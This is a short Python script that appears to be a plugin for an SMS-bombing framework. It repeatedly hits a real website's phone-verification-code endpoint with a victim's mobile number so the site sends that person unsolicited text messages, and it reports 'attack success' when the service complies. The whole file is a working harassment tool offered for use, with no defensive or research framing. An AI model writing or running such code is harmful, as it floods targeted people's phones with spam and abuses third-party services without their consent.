#!/usr/bin/env python
# coding=utf-8
__author__ = 'pyphrb'
import sys
import os
from baseframe import SmsFrame
from curl import HttpRequest
from pprint import pprint
class MyCode(SmsFrame):
    sms_exp = {
        'exp': {
            'name': None,
            'author': 'SMS_BOMBING',
            'create_time': '2014-12-11'
        }
    }

    def verify(self, mobile):
        self.request = HttpRequest.Http("http://member.ync365.com", self.args[0], "/check/getcode?mobile=")
        if "\"ok\":\"1\"" in self.request.get_request():
            print 'attack success send a spam message' + 'to' + self.args[0]

if __name__ == "__main__":
    mc = MyCode()
    mc.run()